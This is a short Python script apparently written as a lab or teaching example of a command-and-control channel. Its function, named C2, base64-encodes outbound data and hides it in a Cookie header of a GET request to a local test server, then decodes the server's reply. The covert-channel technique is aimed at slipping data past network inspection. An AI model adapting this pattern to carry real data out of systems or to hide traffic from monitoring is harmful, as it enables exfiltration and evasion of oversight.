import requests
from base64 import b64encode, b64decode

def C2(url, data):
    # Encode outbound data
    encoded = b64encode(data).decode()

    # Send GET request with data stored in a fake header
    response = requests.get(url, headers={"Cookie": encoded})

    # Display server response
    print("[+] Server Response:", b64decode(response.content).decode())

# -----------------------------

url = "http://127.0.0.1:8443"
data = b"test data from client"

C2(url, data)
